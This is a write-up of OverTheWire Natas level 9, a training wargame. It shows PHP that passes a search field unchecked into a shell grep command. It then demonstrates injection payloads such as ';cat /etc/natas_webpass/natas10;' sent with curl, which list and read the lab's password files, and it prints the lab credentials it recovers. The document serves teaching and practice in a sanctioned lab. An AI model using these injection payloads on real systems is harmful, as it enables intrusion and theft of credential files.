# Level 9
```html
$ curl --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The source code is provided:
```html
$ curl -s --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</
script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing:
 <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The user input is not checked and we can inject commands:
* `;cat`: will reveal the entire dictionary
* `;pwd;`: will show where we are
* `;ls -la;`; show all files

Let's exploit this vulnerability to read the password of level10 located in `/etc/natas_webpass/` as mentioned in the [natas instructions](https://overthewire.org/wargames/natas/).

Let's first list the files in `/etc/natas_webpass/`
~~~~
$ curl -s --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -d "needle=;ls -l /etc/natas_webpass/;&submit=Search" -X POST http://natas9.natas.labs.overthewire.org/ | html2text 

****** natas9 ******
Find words containing: [needle              ][Search]

Output:
total 140
-r--r----- 1 natas0  natas0   7 Dec 20  2016 natas0
-r--r----- 1 natas1  natas0  33 Dec 20  2016 natas1
-r--r----- 1 natas10 natas9  33 Dec 20  2016 natas10
-r--r----- 1 natas11 natas10 33 Dec 20  2016 natas11
-r--r----- 1 natas12 natas11 33 Jul 23  2019 natas12
-r--r----- 1 natas13 natas12 33 Dec 29  2017 natas13
-r--r----- 1 natas14 natas13 33 Dec 20  2016 natas14
-r--r----- 1 natas15 natas14 33 Dec 20  2016 natas15
-r--r----- 1 natas16 natas15 33 Dec 20  2016 natas16
-r--r----- 1 natas17 natas16 33 Dec 20  2016 natas17
-r--r----- 1 natas18 natas17 33 Oct 25  2018 natas18
-r--r----- 1 natas19 natas18 33 Oct 25  2018 natas19
-r--r----- 1 natas2  natas1  33 Dec 20  2016 natas2
-r--r----- 1 natas20 natas19 33 Dec 20  2016 natas20
-r--r----- 1 natas21 natas20 33 Dec 20  2016 natas21
-r--r----- 1 natas22 natas21 33 Dec 20  2016 natas22
-r--r----- 1 natas23 natas22 33 Dec 20  2016 natas23
-r--r----- 1 natas24 natas23 33 Mar 19  2018 natas24
-r--r----- 1 natas25 natas24 33 Dec 20  2016 natas25
-r--r----- 1 natas26 natas25 33 Dec 20  2016 natas26
-r--r----- 1 natas27 natas26 33 Mar 26  2018 natas27
-r--r----- 1 natas28 natas27 33 Dec 20  2016 natas28
-r--r----- 1 natas29 natas28 33 Dec 20  2016 natas29
-r--r----- 1 natas3  natas2  33 Dec 20  2016 natas3
-r--r----- 1 natas30 natas29 33 Oct 29  2018 natas30
-r--r----- 1 natas31 natas30 33 Dec 15  2016 natas31
-r--r----- 1 natas32 natas31 33 Dec 15  2016 natas32
-rw------- 1 root    root    33 Oct 27  2018 natas33
-r--r----- 1 natas34 natas33 33 Oct 27  2018 natas34
-r--r----- 1 natas4  natas3  33 Dec 20  2016 natas4
-r--r----- 1 natas5  natas4  33 Dec 20  2016 natas5
-r--r----- 1 natas6  natas5  33 Dec 20  2016 natas6
-r--r----- 1 natas7  natas6  33 Dec 20  2016 natas7
-r--r----- 1 natas8  natas7  33 Dec 20  2016 natas8
-r--r----- 1 natas9  natas8  33 Dec 20  2016 natas9
View_sourcecode
~~~~

OK, let's try to display the content of `natas10`:
~~~~
$ curl -s --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -d "needle=;cat /etc/natas_webpass/natas10;&submit=Search" -X POST http://natas9.natas.labs.overthewire.org/ | html2text 

****** natas9 ******
Find words containing: [needle              ][Search]

Output:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
View_sourcecode
~~~~

# Flag
~~~~
natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
~~~~
